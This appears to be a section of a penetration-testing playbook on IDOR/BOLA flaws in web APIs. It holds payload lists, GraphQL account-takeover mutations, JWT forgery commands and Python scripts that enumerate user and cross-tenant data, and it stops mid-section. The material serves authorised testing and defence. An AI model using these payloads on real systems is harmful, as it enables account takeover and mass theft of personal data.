## 2.8 INSECURE DIRECT OBJECT REFERENCE (IDOR) / BROKEN OBJECT LEVEL AUTHORIZATION (BOLA) — COMPLETE DETECTION & EXPLOITATION


**═══ IDOR / BOLA — COMPLETE DETECTION & EXPLOITATION ═══**

CWE: CWE-639 | CVSS: 6.5-8.6 | OWASP: A01:2021 Broken Access Control
# IDOR/BOLA is the most common API vulnerability. Covers: numeric ID
enumeration, UUID prediction, hash-based ID bypass, GraphQL IDOR,
# BFLA (Broken Function Level Authorization), multi-step IDOR chains,
and automated IDOR detection methodology.
Subsections 2.8.1-2.8.9 cover core techniques.
Subsection 2.8.10 covers advanced exploitation techniques.

### 2.8.1 IDOR Detection Methodology — Systematic Approach

Step 1: MAP ALL OBJECT REFERENCES — Identify every endpoint that accepts an object identifier:
- URL path parameters: /api/users/123/profile, /api/orders/456, /api/documents/789/download
- Query parameters: /api/invoice?id=1001, /search?user_id=555
- POST/PUT body parameters: {"user_id": 123, "order_id": 456}
- HTTP headers: X-User-ID: 123, X-Account-ID: 456
- Cookie values: session_user=123, account=ABC
- GraphQL variables: query { user(id: "123") { email } }
- File references: /uploads/user_123_avatar.jpg, /documents/report_456.pdf
- Multipart form data: hidden fields containing IDs

Step 2: IDENTIFY ID TYPES AND PATTERNS:
- Sequential integers: 1, 2, 3... (trivially enumerable)
- UUIDs v1: CONTAINS TIMESTAMP + MAC ADDRESS — partially predictable (extract timestamp, guess MAC)
- UUIDs v4: Random — NOT a security control, can be leaked via API responses, logs, URLs, Referer headers
- Encoded IDs: Base64(user_id) — decode, modify, re-encode
- Hashed IDs: MD5/SHA1(user_id) — precompute rainbow table if input space is small
- Composite IDs: user_123_order_456 — modify individual components
- Snowflake IDs: Timestamp-based — enumerate within time range
- MongoDB ObjectIDs: Timestamp + machine + PID + counter — partially predictable, enumerate counter
- Short IDs (hashids/nanoid): Often reversible or enumerable within small keyspace
- Numeric string IDs: "00123" — test with/without leading zeros
- Negative IDs: -1 sometimes maps to admin or special accounts

Step 3: CREATE TWO ACCOUNTS (minimum) — Account A (attacker) and Account B (victim):
- Log in as Account A, capture all session tokens/cookies
- Log in as Account B, capture all session tokens/cookies
- Identify every ID belonging to each account

Step 4: SYSTEMATIC TESTING — For EVERY endpoint with object references:
a) Using Account A's session, replace Account A's object ID with Account B's object ID
b) Test ALL HTTP methods: GET (read), POST (create), PUT (update), PATCH (partial update), DELETE (destroy)
c) Test with NO authentication (remove auth header entirely)
d) Test with expired/invalid tokens
e) Compare response codes AND response bodies (200 with empty body ≠ proper authorization)

### 2.8.2 IDOR ID Bypass Techniques — Advanced

Technique 1 — PARAMETER POLLUTION:
/api/users?id=123&id=456 (HPP — server may use first or last)
/api/users?id=123,456 (CSV injection)
/api/users?id[]=123&id[]=456 (Array parameter)
/api/users?id=456&admin_id=123 (Add additional ID parameter)

Technique 2 — JSON PARAMETER POLLUTION:
{"id": 456} → {"id": 456, "id": 123} (duplicate key — last wins in most parsers)
{"id": 456} → {"id": [456]} (wrap in array)
{"id": 456} → {"id": {"id": 456}} (wrap in object)
{"id": 456} → {"id": "456"} (change type: int → string)
{"id": "456"} → {"id": 456} (change type: string → int)
{"id": 456} → {"id": 456.0} (float)
{"id": 456} → {"id": "456\x00789"} (null byte injection)

Technique 3 — ID ENCODING VARIATIONS:
/api/users/456 → /api/users/0x1C8 (hex)
/api/users/456 → /api/users/0710 (octal)
/api/users/456 → /api/users/NDU2 (base64)
/api/users/456 → /api/users/456%00 (null byte)
/api/users/456 → /api/users/456%20 (trailing space)
/api/users/456 → /api/users/+456 (leading plus)
/api/users/456 → /api/users/ 456 (leading space)
/api/users/456 → /api/users/456.json (extension appending)
/api/users/456 → /api/users/456/ (trailing slash)
/api/users/456 → /api/users/456;.js (semicolon path parameter)

Technique 4 — HTTP METHOD OVERRIDE:
POST /api/users/456 with X-HTTP-Method-Override: DELETE
POST /api/users/456 with X-Method-Override: PUT
POST /api/users/456?_method=DELETE
POST /api/users/456 with X-Original-Method: PATCH

Technique 5 — WILDCARD AND SPECIAL VALUES:
/api/users/* (wildcard — may return all users)
/api/users/0 (zero — may map to admin or first user)
/api/users/-1 (negative — error handling may leak data)
/api/users/null (null string)
/api/users/undefined (undefined)
/api/users/NaN (NaN)
/api/users/true (boolean coercion)
/api/users/self (some frameworks resolve "self" to current user)
/api/users/me (alias for current user — test if it bypasses checks)
/api/users/.. (path traversal in ID)

Technique 6 — GRAPHQL-SPECIFIC IDOR:
Direct query with victim's ID
query { user(id: "VICTIM_ID") { email password ssn creditCard } }

Alias batching — enumerate many IDs in single request
query {
u1: user(id: "1") { email }
u2: user(id: "2") { email }
u3: user(id: "3") { email }
... enumerate up to thousands of users in one request
}

Nested object traversal
query { user(id: "ATTACKER_ID") { organization { members { id email role } } } }

Mutation with victim's ID
mutation { updateUser(id: "VICTIM_ID", input: { email: "attacker@evil.com" }) { id } }

Subscription-based IDOR
subscription { userUpdated(id: "VICTIM_ID") { email phone address } }

Technique 7 — UUID EXPLOITATION:
- UUID v1 extraction: Extract timestamp and MAC from target UUID, generate adjacent UUIDs
- UUID v1 time-based enumeration: If you know approximate creation time, generate candidate UUIDs
- UUID leak sources: Check API responses (user listings, search results), JavaScript source, error messages, 
Referer headers, URL sharing features, PDF metadata, email headers, websocket messages, GraphQL introspection
- MongoDB ObjectID prediction: First 4 bytes = timestamp, next 5 = machine+PID, last 3 = counter
If you have one ObjectID, increment counter for adjacent objects created on same machine

Technique 8 — SECOND-ORDER IDOR:
- Change your OWN profile to contain victim's ID, then access features that reference "your" profile
- Create objects that reference victim's IDs in relational fields
- Exploit import/export features that process IDs from uploaded files (CSV injection with victim IDs)
- Webhook/callback URLs containing victim object IDs

Technique 9 — ENDPOINT VERSION BYPASS:
/api/v2/users/456 (protected) → /api/v1/users/456 (may lack authorization)
/api/users/456 → /internal/api/users/456 (internal endpoint)
/api/users/456 → /api/admin/users/456 (admin endpoint may be accessible)
/graphql → /graphql/v1 (older version may lack auth)

### 2.8.3 IDOR Exploitation Scenarios — Real-World Impact

Scenario A — HORIZONTAL PRIVILEGE ESCALATION (Read):
1. GET /api/users/VICTIM_ID/profile → Read victim's PII (name, email, phone, SSN, address)
2. GET /api/users/VICTIM_ID/orders → Read victim's order history
3. GET /api/users/VICTIM_ID/documents → Download victim's private documents
4. GET /api/users/VICTIM_ID/payment-methods → Read stored credit cards, bank accounts
Impact: Mass PII disclosure, financial data breach

Scenario B — HORIZONTAL PRIVILEGE ESCALATION (Write):
1. PUT /api/users/VICTIM_ID/profile → Modify victim's profile (email change → account takeover)
2. POST /api/users/VICTIM_ID/password-reset → Reset victim's password
3. DELETE /api/users/VICTIM_ID/payment-methods/PM_ID → Delete victim's payment methods
4. PUT /api/users/VICTIM_ID/settings → Modify victim's security settings (disable 2FA)
Impact: Account takeover, data manipulation, financial fraud

Scenario C — VERTICAL PRIVILEGE ESCALATION:
1. Access admin-only endpoints: GET /api/admin/users (with regular user token)
2. Modify role field: PUT /api/users/ATTACKER_ID {"role": "admin"}
3. Access other tenants in multi-tenant apps: GET /api/tenants/OTHER_TENANT_ID/data
4. Access internal APIs: GET /internal/api/config → leaked API keys, database credentials
Impact: Full application compromise, multi-tenant data breach

Scenario D — FILE-BASED IDOR:
1. Predictable file paths: /uploads/user_123/avatar.jpg → /uploads/user_456/avatar.jpg
2. Document download: /api/documents/download?file=report_123.pdf → report_456.pdf
3. Signed URL bypass: Modify the object ID in a pre-signed URL, some apps only sign the base URL
4. Directory traversal + IDOR: /api/files?path=../user_456/private/secrets.txt
Impact: Sensitive document theft, medical records, legal documents, tax returns

### 2.8.4 IDOR Automation and Tooling

Tool 1 — BURP AUTORIZE:
1. Install Autorize extension in Burp Suite
2. Configure with low-privilege session cookie/token
3. Browse application as high-privilege user (admin)
4. Autorize automatically replays EVERY request with low-privilege cookie
5. Flag responses where low-privilege gets same data as high-privilege
6. Also test with no cookie (unauthenticated) to find public data leaks

Tool 2 — BURP AUTH ANALYZER:
Similar to Autorize but supports multiple session states simultaneously
Configure: Admin session, Regular user session, No session
Compares responses across all three privilege levels

Tool 3 — CUSTOM ENUMERATION SCRIPTS:
Python IDOR enumeration
import requests
session = requests.Session()
session.headers = {"Authorization": "Bearer ATTACKER_TOKEN"}
for user_id in range(1, 10000):
r = session.get(f"https://target.com/api/users/{user_id}/profile")
if r.status_code == 200:
print(f"[IDOR] User {user_id}: {r.json()}")
elif r.status_code != 403:
print(f"[INTERESTING] User {user_id}: {r.status_code}")

Tool 4 — PARAM MINER (Burp Extension):
Discover hidden parameters that accept object IDs
Identify shadow parameters: user_id, account_id, org_id, tenant_id

### 2.8.5 IDOR Chaining — Maximum Impact

Chain 1: IDOR (Read PII) → Social Engineering → Account Takeover
Chain 2: IDOR (Read Email) → Password Reset → Full Account Takeover
Chain 3: IDOR (File Download) → Source Code Leak → Hardcoded Credentials → Admin Access
Chain 4: IDOR (Modify Email) → Email Change → Password Reset → ATO → Privilege Escalation
Chain 5: IDOR (Read API Keys) → API Abuse → Data Exfiltration → Lateral Movement
Chain 6: IDOR (Admin Panel Access) → Configuration Change → RCE
Chain 7: GraphQL IDOR → Mass User Enumeration → Credential Stuffing → Mass ATO
Chain 8: IDOR (Webhook Modification) → Redirect Callbacks → Token Theft → API Takeover


### 2.8.6 ADVANCED IDOR TECHNIQUES — COMPLETE (Missing Techniques)

Technique 10 — ASYNC ACTION IDOR:
Modern apps use async workflows — IDOR lurks in every async resource:
- Job status endpoints: GET /api/jobs/JOB_ID/status → read other users' job results
- Job result download: GET /api/jobs/JOB_ID/result → download other users' processed data
- Webhook callback IDs: GET /api/webhooks/WH_ID/deliveries → read other users' webhook payloads
- Queue message IDs: GET /api/queue/MSG_ID → peek at other users' queued messages (SQS, RabbitMQ)
- Notification IDs: PUT /api/notifications/NOTIF_ID/read → mark others' notifications as read
- Export job IDs: GET /api/exports/EXPORT_ID/download → download other users' CSV/PDF exports
- Background task IDs: GET /api/tasks/TASK_ID → view other users' background processing
- Async agent execution: GET /api/agents/EXEC_ID → read other users' AI agent results (SuperAGI CVE)
- Report generation: GET /api/reports/REPORT_ID → view other users' generated reports
Testing methodology:
1. Create resource → trigger async processing → capture job/task ID
2. Switch to Account B session → access same job/task ID
3. If data returned → IDOR in async workflow
4. Test both status polling AND result download endpoints separately
5. Check if webhook delivery logs expose request/response payloads of other users

Technique 11 — CROSS-ENDPOINT OBJECT REUSE:
Same object ID valid across multiple API endpoints with inconsistent authorization:
- Order ID: /api/orders/123 → /api/shipping/123 → /api/refunds/123 → /api/invoices/123
- User ID: /api/users/123 → /api/admin/users/123 → /api/billing/users/123 → /api/audit/users/123
- Document ID: /api/docs/123 → /api/share/123 → /api/print/123 → /api/export/123
- File ID: /api/files/123 → /api/preview/123 → /api/download/123 → /api/versions/123
- Ticket ID: /api/tickets/123 → /api/tickets/123/comments → /api/tickets/123/attachments
Testing methodology:
1. Collect every endpoint that references the same object type
2. Test IDOR on EACH endpoint independently — one may be protected while another is not
3. Pay special attention to: export, download, share, print, audit, admin variants
4. Fuzz sibling endpoints: if /api/albums/123/photos exists, try /api/albums/123/share,
/api/albums/123/export, /api/albums/123/audit, /api/albums/123/metadata
5. Copy GET response body → replay as PUT/PATCH to same endpoint (server may accept all fields)
6. Check internal/admin API paths: /internal/api/users/123, /admin/api/users/123, /backoffice/users/123

Technique 12 — JWT BINDING BYPASS:
JWT claims bind user to object — bypass by manipulating claims:
- If JWT contains user_id/sub claim: Decode → modify to victim's ID → re-encode
Works when: alg=none accepted, HMAC secret weak/known, algorithm confusion (RS256→HS256)
Tool: jwt_tool -T -S hs256 -p "secret" -I -pc user_id -pv VICTIM_ID
- If object ID bound to JWT via custom claim (org_id, tenant_id, account_id):
Modify claim to target org/tenant → bypass org-level isolation
- If token scope/permissions are claim-based:
Add "role": "admin", "scope": "admin:write" to JWT payload
- Cross-endpoint token confusion: Token from /accounts endpoint may have broader scope
than token from /sessions endpoint (real-world CVE: viewer→admin via token swap)
- djangorestframework-simplejwt CVE: JWTAuthentication.get_user looks up by USER_ID_CLAIM
without additional authorization → modify claim → impersonate any user
- CVE-2025-04692 (python-jose): Algorithm confusion RS256→HS256 → forge any user_id claim
Testing methodology:
1. Decode JWT payload → identify user-binding claims (sub, user_id, org_id, tenant_id)
2. Try alg:none attack → remove signature → modify claims
3. Try HMAC brute force → jwt_tool -C -d wordlist.txt → crack secret → forge any claim
4. Try algorithm confusion → use public key as HMAC secret
5. Compare tokens from different endpoints → use broader-scoped token for restricted actions

Technique 13 — FRONTEND-BACKEND DESYNC IDOR:
Frontend validates authorization but backend doesn't (or vice versa):
- Frontend hides "Delete" button for non-owners → backend DELETE endpoint has no ownership check
- Frontend filters list to show only user's items → backend API returns ALL items
- Frontend restricts navigation to /admin → backend /api/admin/ has no role check
- Frontend validates user_id in JavaScript → bypass by calling API directly via curl/Burp
CWE-602: Client-Side Enforcement of Server-Side Security
OneUptime CVE: is-multi-tenant-query header trusted client-side → bypasses ALL authorization
Testing methodology:
1. NEVER trust the frontend — always test backend APIs directly
2. Remove all client-side checks (JS authorization, UI element hiding)
3. Replay requests from Burp with modified IDs — the backend is what matters
4. Check if frontend enforces pagination/filtering that backend doesn't enforce
5. Test admin endpoints that the UI doesn't link to but that exist in the API
6. Inspect JavaScript source for hidden routes: grep for /api/, /admin/, endpoint patterns
7. Check for client-controlled headers that bypass auth: X-Internal, is-admin, is-multi-tenant

Technique 14 — CLOUD JOB/BUCKET ABUSE:
IDOR in cloud-native architectures — object IDs reference cloud resources:
- S3 bucket objects: /api/files/download?key=user_123/doc.pdf → change to user_456/doc.pdf
- Pre-signed URL abuse: Server generates S3 pre-signed URL from user-supplied objectKey
Attacker modifies objectKey → gets pre-signed URL to any S3 object
Supply "/" as objectKey → triggers bucket listing → enumerate all files
Supply "../other-bucket/secret" → path traversal in S3 key
(ivision research: pre-signed URL IDOR in AWS S3)
- Lambda job IDs: /api/jobs/LAMBDA_JOB_ID → access other users' Lambda execution results
- SQS queue message IDs: /api/queue/MSG_ID → peek/delete other users' queue messages
- GCP Storage objects: /api/files?bucket=user-bucket&object=secret.pdf → modify bucket/object
- Azure Blob Storage: /api/blobs/CONTAINER/BLOB_ID → access other containers/blobs
- CloudFront signed URLs: If signing logic trusts user-supplied path → access any resource
Testing methodology:
1. Identify endpoints that generate signed/pre-signed URLs
2. Modify the object key/path parameter before URL generation
3. Test empty/null values → may trigger bucket listing
4. Test path traversal in object keys: ../other-user/secret.pdf
5. Check if pre-signed URLs include user-scoping in the key → if not, IDOR exists

Technique 15 — BLIND IDOR DETECTION:
No direct feedback — detect via indirect signals:
- Time-based: DELETE /api/users/VICTIM_ID → response takes 500ms vs 50ms for non-existent
Longer processing time = object exists AND was acted upon (even if response says "success")
- State-change verification: POST /api/friend-request?to=VICTIM_ID → login as victim → check
- Email/SMS notification: Trigger action on victim ID → check if victim receives notification
(e.g., "Someone viewed your profile", "Your email was changed")
- Webhook callback: If action triggers webhook → monitor attacker-controlled webhook URL
- Out-of-band (OOB): Action triggers DNS lookup or HTTP callback → Burp Collaborator
- Response size differential: 404 (32 bytes) vs 403 (48 bytes) vs 200 (0 bytes) → size leaks info
403 = "object exists but denied" vs 404 = "doesn't exist" → enumerate valid IDs
- Side-channel via caching: X-Cache: HIT means resource was requested before (exists)
- Audit log poisoning: Action on victim ID creates entry in victim's audit log
- Error message differences: "User not found" vs "Permission denied" → confirms existence
- Parlov framework: Formal differential-based approach — send paired requests to owned vs
target resources, compare timing, body size, headers for statistical differences
Testing methodology:
1. Create two accounts — perform action on OWN resource → measure response baseline
2. Perform same action on VICTIM resource → compare response time, size, headers
3. Login as victim → check for state changes (notifications, audit logs, modified data)
4. Set up Burp Collaborator → test if action triggers OOB interaction for victim ID
5. Use statistical analysis: repeat each request 10+ times to filter network jitter

Technique 16 — MASS ASSIGNMENT + IDOR CHAIN:
Combine IDOR (write to another user's record) + mass assignment (inject protected fields):
Step 1 — Confirm write IDOR:
PATCH /api/users/VICTIM_ID {"display_name": "hacked"} → modifies victim's profile
Step 2 — Test mass assignment on own account:
PATCH /api/users/ATTACKER_ID {"role": "admin", "is_admin": true, "permissions": ["*"]}
If accepted → mass assignment exists
Step 3 — Chain: Write IDOR + Mass Assignment:
PATCH /api/users/VICTIM_ID {"role": "admin", "is_admin": true}
→ Victim account now has admin privileges → attacker logs into victim account
Additional mass assignment fields to test:
"isVerified": true, "emailVerified": true, "twoFactorEnabled": false
"balance": 99999, "credits": 99999, "plan": "enterprise"
"organizationId": "ATTACKER_ORG", "tenantId": "ATTACKER_TENANT"
"password": "newpassword", "resetToken": "controlled_value"
HackerOne real-world: MizbanApp IDOR + mass assignment → full account takeover
Bug Bounty Playbook: Write IDOR + mass assignment = $5K-$15K bounty consistently

Technique 17 — TOKEN CONFUSION:
Using token handling flaws to enable IDOR:
- Expired tokens: System validates token presence but ignores expiry → reuse old tokens
with modified resource IDs indefinitely
- Cross-endpoint tokens: Token from /api/v1/sessions works on /api/v2/admin
Different endpoints issue tokens with different scopes — use broader token on restricted API
Real-world: /accounts token had admin scope while /sessions token was viewer-only
- Missing token validation: Some endpoints check auth but not authorization
Token valid for Account A → used to access Account B's resources (no ownership check)
- Refresh token abuse: Refresh token from expired session still works → generate new
access token with modified claims
- API key vs session token: API key may bypass session-level IDOR checks
- Internal service tokens: Service-to-service tokens may have no user binding
Use stolen service token → access any user's data
Testing methodology:
1. Collect tokens from EVERY endpoint (login, OAuth, API key, refresh, service)
2. Test each token against EVERY other endpoint — cross-pollinate tokens
3. Test expired tokens with modified IDs — check if expiry is validated
4. Compare token scopes: does one token grant broader access than expected?

Technique 18 — CONTENT-TYPE BYPASS FOR IDOR:
Switching request format to bypass authorization middleware:
- JSON → XML: Authorization middleware only parses JSON for user_id validation
Switch to: Content-Type: application/xml → middleware skips validation → IDOR succeeds
- JSON → form-data: Content-Type: application/x-www-form-urlencoded
Some frameworks route authorization differently based on Content-Type
- JSON → multipart: Content-Type: multipart/form-data; boundary=XXX
Embed object ID in multipart body — middleware may not inspect multipart
- Extension-based: /api/users/123 → /api/users/123.json → /api/users/123.xml
Different serializers/deserializers may have different auth middleware chains
- GraphQL format switch: REST endpoint protected → same data via GraphQL unprotected
- Remove Content-Type entirely: Some middleware skips auth check if Content-Type missing
Real-world: ASP.NET app with different model binding for JSON vs form-data →
Content-Type: application/x-www-form-urlencoded bypassed field-level validation
Testing methodology:
1. For EVERY IDOR-protected endpoint, replay with ALL Content-Types:
application/json, application/xml, text/xml, application/x-www-form-urlencoded,
multipart/form-data, text/plain, no Content-Type header
2. Test URL extension variations: .json, .xml, .yaml, .csv, .html
3. Check if GraphQL/REST have different auth for same data model
4. Test SOAP endpoint if WSDL discovered — may lack object-level checks

Technique 19 — RACE CONDITION + IDOR:
Concurrent requests bypass ownership checks via TOCTOU:
- Double-spend: Transfer $100 from account with $100 balance → send 5 concurrent requests
Each reads balance=$100 → each passes check → 5 x $100 transferred (AVideo CVE)
- Concurrent ownership transfer: Two users simultaneously claim same unclaimed resource
→ ownership confusion → attacker gets access to victim's resource
- Coupon + IDOR: Apply same coupon to different user's order simultaneously
→ multiple discounts applied across accounts
- Concurrent DELETE + READ: Read resource while concurrent delete processes
→ get data that should have been deleted
- File access race: Upload file → concurrent request accesses file before ownership set
Tool: Burp Repeater "Send group in parallel (single-packet attack)" for HTTP/2
Tool: Turbo Intruder race-single-packet-attack.py for HTTP/1.1 last-byte sync
Testing methodology:
1. Identify state-changing operations with ownership checks (transfers, claims, deletes)
2. Send 20-30 identical requests in a single TCP packet targeting the same resource
3. Check if multiple requests succeed when only one should
4. Monitor for inconsistent state: resource owned by wrong user, duplicate transactions

Technique 20 — BOLA IN MICROSERVICES:
Service-to-service authorization missing in microservice architectures:
- Internal APIs trust caller without per-object checks:
User → API Gateway (auth check) → Service A → Service B (NO auth check)
Service B assumes "if Service A called me, the user is authorized" → WRONG
Attacker bypasses API Gateway → calls Service B directly → IDOR on any object
- Kubernetes-hosted APIs: Internal services become semi-external via Ingress misconfig
K8s pods skip authorization because "they're internal" → lateral IDOR
- Missing tenant scoping in shared databases:
Service A queries: SELECT * FROM orders WHERE id = ? (no tenant_id filter)
→ any user's order accessible if ID is known
- GraphQL federation: Subgraph resolvers may not enforce authorization independently
Query routed to subgraph → subgraph trusts federation gateway → returns any data
- Event-driven: Kafka/SQS consumer processes events without validating originating user
Inject event with victim's user_id → consumer processes as if legitimate
Testing methodology:
1. Map all microservice endpoints (service mesh, internal DNS, K8s services)
2. Test each service DIRECTLY (bypass API gateway) with user-level tokens
3. Check if internal services have ANY authorization beyond network-level access
4. Test with service-to-service tokens — do they have unbounded access?
5. Check database queries: do they include tenant_id/user_id in WHERE clause?

Technique 21 — AI/LLM-ASSISTED IDOR DETECTION:
Using AI to discover and exploit IDOR at scale:
- BOLABuster (Palo Alto Networks Unit 42):
Input: OpenAPI 3 specification
Process: LLM identifies endpoints with object-identifying parameters (userId, orderId)
Builds dependency trees → generates executable test plans → bash scripts
Creates two-user scenarios: User A's resource accessed by User B's token
Analyzes responses to flag BOLA/IDOR vulnerabilities automatically
- LLM Code Analysis (Semgrep + LLM augmentation):
Feed codebase to LLM → trace data flow from parameter to database query
Identify missing ownership checks: "WHERE id = ?" without "AND user_id = ?"
Benchmark: 53% of critical vulns are auth flaws, LLM detects in ~40 min vs manual 2-4 hrs
- AI-Powered Endpoint Discovery:
Feed JavaScript bundles, API docs, Swagger/OpenAPI to LLM
Generate comprehensive IDOR test cases for every endpoint
Identify parameter relationships: "order_id in /orders also valid in /invoices"
- Automated Test Generation:
LLM generates: multi-user test scenarios, edge cases, chaining strategies
Output: executable scripts (Python/bash) that test all IDOR vectors
Tools:
BOLABuster: https://unit42.paloaltonetworks.com/automated-bola-detection-and-ai/
Semgrep + LLM rules: custom rules to detect missing authorization patterns
Burp AI Extensions: AI-powered analysis of authorization patterns

### 2.8.7 IDOR IN SPECIFIC ARCHITECTURES — DEEP CONTEXT

Architecture 1 — MULTI-TENANT APPLICATION IDOR:
Most dangerous IDOR class — cross-tenant data breach:
- Tenant isolation bypass via client-controlled header:
X-Tenant-ID: VICTIM_TENANT → server trusts header → accesses victim's tenant data
OneUptime CVE: is-multi-tenant-query: true → bypasses ALL tenant scoping
- Tenant ID in URL: /api/tenants/VICTIM_TENANT/users → no server-side tenant validation
- Tenant ID in JWT: Modify tenant_id claim → access different tenant's data
- Sequential tenant IDs: tenant_1, tenant_2 → trivially enumerate all tenants
- Shared database without row-level security: Missing WHERE tenant_id = ? in queries
- Cross-tenant API key: API key from tenant A works in tenant B context
Testing methodology:
1. Create accounts in TWO different tenants
2. Use Tenant A's session → access Tenant B's resources
3. Check every tenant-scoped endpoint: user management, billing, configuration, data
4. Test client-controlled tenant headers: X-Tenant-ID, X-Org-ID, projectId
5. Modify JWT tenant claims → test if server validates against authenticated session
Impact: CRITICAL — full cross-tenant data breach, regulatory violation (GDPR/SOC2/HIPAA)

Architecture 2 — GRAPHQL RELAY NODE IDOR:
GraphQL Relay specification exposes global node(id) query:
query { node(id: "BASE64_ENCODED_GLOBAL_ID") { ... on User { email ssn } } }
CVE-2025-31481 (API Platform Core): Relay node field bypasses security rules entirely
- ResolverFactory used generic empty Query context → ACLs skipped for node queries
- Unauthenticated attackers could read admin-restricted data via global ID
Alias batching with node:
query {
n1: node(id: "VXNlcjox") { ... on User { email } }
n2: node(id: "VXNlcjoy") { ... on User { email } }
n3: node(id: "VXNlcjoz") { ... on User { email } }
Enumerate thousands of users in single request
}
Testing methodology:
1. Check if GraphQL exposes node(id) query (Relay interface)
2. Generate base64-encoded global IDs: base64("User:1"), base64("User:2")
3. Query node with each ID → check if authorization enforced on node resolver
4. Test mutations via node interface if available
5. Alias-batch hundreds of node queries in single request

Architecture 3 — SHADOW API / API VERSIONING IDOR:
Old API versions remain routable with weaker authorization:
- /api/v2/users/123 (protected) → /api/v1/users/123 (IDOR — old version lacks checks)
- Version prefixes to test: v0, v1, v2, v3, beta, alpha, internal, admin, legacy,
staging, dev, test, preview, canary, unstable, experimental, debug
- Hidden documentation discovery:
/swagger, /swagger-ui, /api-docs, /v2/api-docs, /openapi.json, /openapi.yaml,
/graphql/schema, /graphql/playground, /.well-known/openapi, /docs, /redoc
- JavaScript route discovery: Search JS bundles for API endpoints:
grep -oP '/api/[a-zA-Z0-9/_-]+' app.js → find undocumented endpoints
- Wayback Machine: Check web.archive.org for old Swagger docs with retired endpoints
- Sibling endpoint fuzzing: Found /api/orders/123/items → try:
/api/orders/123/share, /api/orders/123/export, /api/orders/123/pdf,
/api/orders/123/audit, /api/orders/123/clone, /api/orders/123/archive
Tools:
kiterunner: API endpoint discovery and fuzzing
Arjun: Hidden parameter discovery
ffuf: Fast fuzzing for endpoint/version enumeration

Architecture 4 — BFLA (Broken Function Level Authorization) + IDOR COMBO:
OWASP API5:2023: Regular user accesses admin functions:
- Endpoint guessing: /api/users → /api/admin/users → /api/users/export_all
- HTTP method switching: GET /api/users/123 (allowed) → DELETE /api/users/123 (should be denied)
PUT /api/users/123 {"role":"admin"} → function-level auth missing
- Admin endpoint patterns to test:
/api/admin/*, /api/internal/*, /api/backoffice/*, /api/management/*,
/api/*/export, /api/*/import, /api/*/bulk, /api/*/all, /api/*/admin
- Combine with IDOR: GET /api/admin/users/VICTIM_ID → read admin view of victim's data
DELETE /api/admin/users/VICTIM_ID → delete victim's account as regular user
Testing methodology:
1. Identify admin-only endpoints from JS source, docs, or path guessing
2. Access admin endpoints with regular user session
3. Try ALL HTTP methods on each endpoint (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS)
4. Check X-HTTP-Method-Override and _method parameter for method switching

### 2.8.8 IDOR Advanced Chaining — Extended Chains

Chain 9: Async IDOR → Export Download → Mass PII Breach
1. User A triggers data export → gets EXPORT_ID
2. Attacker iterates EXPORT_IDs → downloads all users' exports → mass PII breach

Chain 10: Cross-Endpoint IDOR → Invoice Download → Financial Data Theft
1. Order ID from /orders/123 → use in /invoices/123 (weaker auth)
2. Download victim's invoice with bank details, billing address, transaction history

Chain 11: JWT Binding Bypass → Multi-Tenant Access → Complete Data Breach
1. Modify tenant_id in JWT → access different tenant's data
2. Enumerate all tenants → download all tenant data → GDPR-level breach

Chain 12: Blind IDOR → Account State Change → Targeted Attack
1. Blind IDOR resets victim's 2FA → no direct feedback but state changes
2. Attacker credential-stuffs victim → 2FA disabled → full account takeover

Chain 13: Race Condition IDOR → Double-Spend → Financial Fraud
1. Concurrent transfer requests → balance check passes for all → multiple transfers
2. Attacker receives N × amount while victim loses 1 × amount

Chain 14: Mass Assignment IDOR → Role Escalation → Admin Takeover → RCE
1. Write IDOR on victim → mass assignment sets role=admin
2. Admin access → file upload → web shell → RCE

Chain 15: Cloud Bucket IDOR → Pre-signed URL → Sensitive Document Theft
1. IDOR in objectKey parameter → generate pre-signed URL for any S3 object
2. Enumerate keys → download all files in bucket → source code, secrets, PII

Chain 16: BOLA Microservice → Internal API → Cloud Metadata → Full Compromise
1. Bypass API gateway → hit internal service directly → IDOR on any user
2. SSRF from internal service → cloud metadata → IAM credentials → full cloud compromise

### 2.8.9 IDOR Detection Automation — Complete Tooling Reference

Tool 5 — BOLABUSTER (AI-Powered):
Feed OpenAPI spec → LLM generates IDOR test cases → automated execution
Two-user scenario: create resources with User A, access with User B
Output: flagged endpoints with BOLA/IDOR vulnerabilities

Tool 6 — AUTORIZE + AUTH MATRIX (Burp):
Configure multiple user roles (admin, user, guest, no-auth)
Autorize replays EVERY request across ALL role levels
Auth Matrix extension: visual matrix of endpoint × role authorization

Tool 7 — APISEC/STACKHAWK (CI/CD Integration):
Automated IDOR testing in CI/CD pipeline
Run on every deploy → catch IDOR regressions before production
OpenAPI-driven test generation → comprehensive endpoint coverage

Tool 8 — CUSTOM MULTI-TENANT IDOR SCANNER:
Python: Cross-tenant IDOR enumeration
import requests
tenant_a_token = "eyJ..." # Account in Tenant A
tenant_b_resources = ["/api/users/1", "/api/orders/1", "/api/docs/1"]
for resource in tenant_b_resources:
for method in ['GET', 'PUT', 'DELETE', 'PATCH']:
r = requests.request(method, f"https://target.com{resource}",
headers={"Authorization": f"Bearer {tenant_a_token}"})
if r.status_code not in [401, 403, 404]:
print(f"[IDOR] {method} {resource} → {r.status_code} ({len(r.content)} bytes)")

Tool 9 — PARLOV (Blind IDOR Oracle Detection):
Differential analysis: send paired requests to owned vs target resources
Statistical comparison: timing, body size, headers across 10+ iterations
Bayesian verdict: probability that target resource was accessed/modified

Tool 10 — NUCLEI IDOR TEMPLATES:
nuclei -t idor/ → community-maintained IDOR detection templates
Custom template for multi-role testing across endpoints
Integration with projectdiscovery toolchain (httpx, katana, nuclei)


---


---

### MERGED TIER CONTENT (Beginner→Expert)

## E.3 IDOR/BOLA — ADVANCED TIER [MERGED FROM TIER CONTENT — 7]


─── UUID PREDICTION & ENUMERATION ───
# UUIDv1 structure: timestamp(60bit) + clock_seq(14bit) + node/MAC(48bit)
# UUIDv1 is NOT random — it's predictable if you know the generation time
Detection: Request 3 resources, extract UUIDs, check format:
xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx (version 1 = time-based → predictable)
xxxxxxxx-xxxx-4xxx-xxxx-xxxxxxxxxxxx (version 4 = random → not predictable)
# UUIDv1 exploitation:
1. Collect a valid UUIDv1 from your own account
2. Extract timestamp component (first 8+4+4 hex chars, rearranged)
3. Generate UUIDs for nearby timestamps (±100ms)
4. Request each generated UUID → find other users' resources
Tool: uuid_tool, sandwich attack (request before and after target creation)

─── ENCODED/HASHED ID BYPASS ───
Many apps use Base64(id) or MD5(id) instead of raw integers
They assume encoding = security (WRONG — it's obfuscation)
Detection workflow:
